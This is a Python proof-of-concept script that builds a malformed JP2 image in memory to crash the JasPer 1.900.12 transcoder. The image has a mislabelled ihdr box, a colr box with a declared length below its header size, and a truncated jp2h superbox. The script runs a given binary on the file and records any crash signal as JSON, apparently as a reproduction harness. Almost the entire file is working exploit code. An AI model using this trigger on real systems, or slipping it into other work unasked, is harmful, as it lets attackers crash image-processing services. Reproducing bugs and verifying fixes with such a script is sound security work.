#!/usr/bin/env python3
"""PoC: trigger a crash in the JasPer (1.900.12) image transcoder.

Builds a malformed JP2 file in memory at runtime:
  * the mandatory 'ihdr' box inside the 'jp2h' superbox has its box type
    corrupted, so the decoder never records an image-header box, and
  * the following 'colr' box declares a length of 2 bytes, which is smaller
    than the 8-byte box header itself.

The 1.900.12 JP2 parser trusts the bogus box length and dereferences state
that was never initialized, terminating the process with SIGSEGV.  Fixed
builds validate box lengths (and require a proper ihdr box), so they reject
the file gracefully instead of crashing.

The payload is constructed byte-by-byte below; nothing is read from disk.
"""

import argparse
import json
import os
import signal
import struct
import subprocess
import sys
import tempfile
import time

MAX_CAPTURE = 8 * 1024


def build_trigger() -> bytes:
    def box(boxtype: bytes, payload: bytes) -> bytes:
        return struct.pack(">I", 8 + len(payload)) + boxtype + payload

    sig = box(b"jP  ", b"\x0d\x0a\x87\x0a")
    ftyp = box(b"ftyp", b"jp2 " + b"\x00\x00\x00\x00" + b"jp2 ")

    # Valid ihdr payload (8x8 image, 3 components, 8-bit) but stored in a box
    # whose type is intentionally corrupted so it is skipped as unknown.
    ihdr_payload = struct.pack(">IIHBBBB", 8, 8, 3, 7, 7, 0, 0)
    fake_ihdr = struct.pack(">I", 8 + len(ihdr_payload)) + b"\xfehdr" + ihdr_payload

    # 'colr' box with a declared length of 2 (< 8-byte box header).
    bad_colr = struct.pack(">I", 2) + b"colr"

    # The jp2h superbox keeps its original declared length (45) even though
    # its actual contents end early; the trailing bytes are simply absent.
    jp2h = struct.pack(">I", 45) + b"jp2h" + fake_ihdr + bad_colr
    return sig + ftyp + jp2h


def main() -> int:
    parser = argparse.ArgumentParser(description="JasPer crash PoC")
    parser.add_argument("--binary", required=True, help="path to target binary")
    parser.add_argument("--json-out", default=None,
                        help="write JSON result to this path instead of stdout")
    parser.add_argument("--timeout", type=float, default=15.0,
                        help="per-run timeout in seconds (default 15)")
    args = parser.parse_args()

    binary = os.path.abspath(args.binary)
    timeout = max(0.1, args.timeout)

    result = {
        "binary": binary,
        "command": [],
        "returncode": 0,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "observable": {"kind": "custom", "value": "", "path": None},
        "error": None,
    }

    payload = build_trigger()
    tmpdir = tempfile.TemporaryDirectory(prefix="jasper_poc_")
    try:
        in_path = os.path.join(tmpdir.name, "trigger.jp2")
        out_path = os.path.join(tmpdir.name, "output.pnm")
        with open(in_path, "wb") as fh:
            fh.write(payload)

        command = [binary, "--input", in_path, "--output", out_path,
                   "--output-format", "pnm"]
        result["command"] = command

        start = time.monotonic()
        proc = subprocess.Popen(command, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE)
        timed_out = False
        try:
            out, err = proc.communicate(timeout=timeout)
        except subprocess.TimeoutExpired:
            timed_out = True
            proc.kill()
            out, err = proc.communicate()
        runtime_ms = int((time.monotonic() - start) * 1000)

        returncode = proc.returncode if proc.returncode is not None else 0
        sig_name = None
        if returncode < 0:
            try:
                sig_name = signal.Signals(-returncode).name
            except ValueError:
                sig_name = "SIG%d" % (-returncode)

        stdout_text = out.decode("utf-8", errors="replace")[:MAX_CAPTURE]
        stderr_text = err.decode("utf-8", errors="replace")[:MAX_CAPTURE]

        result.update({
            "returncode": returncode,
            "signal": sig_name,
            "timed_out": timed_out,
            "runtime_ms": runtime_ms,
            "stdout": stdout_text,
            "stderr": stderr_text,
        })

        if timed_out:
            result["observable"] = {
                "kind": "combined_output",
                "value": ("process timed out after %.1fs\nstdout:\n%s\n"
                          "stderr:\n%s" % (timeout, stdout_text, stderr_text)),
                "path": None,
            }
        elif sig_name:
            evidence = "process killed by signal %s (exit %d)" % (sig_name,
                                                                  returncode)
            detail = (stderr_text or stdout_text).strip()
            if detail:
                evidence += "\n" + detail
            result["observable"] = {
                "kind": "crash_trace",
                "value": evidence,
                "path": None,
            }
        else:
            combined = (stderr_text + "\n" + stdout_text).strip()
            result["observable"] = {
                "kind": "combined_output",
                "value": combined or "process exited normally (code %d)" % returncode,
                "path": None,
            }
    except Exception as exc:  # noqa: BLE001 - report any PoC-level failure
        result["error"] = "%s: %s" % (type(exc).__name__, exc)
    finally:
        tmpdir.cleanup()

    text = json.dumps(result, indent=2)
    if args.json_out:
        with open(args.json_out, "w") as fh:
            fh.write(text + "\n")
    else:
        print(text)
    return 0


if __name__ == "__main__":
    sys.exit(main())
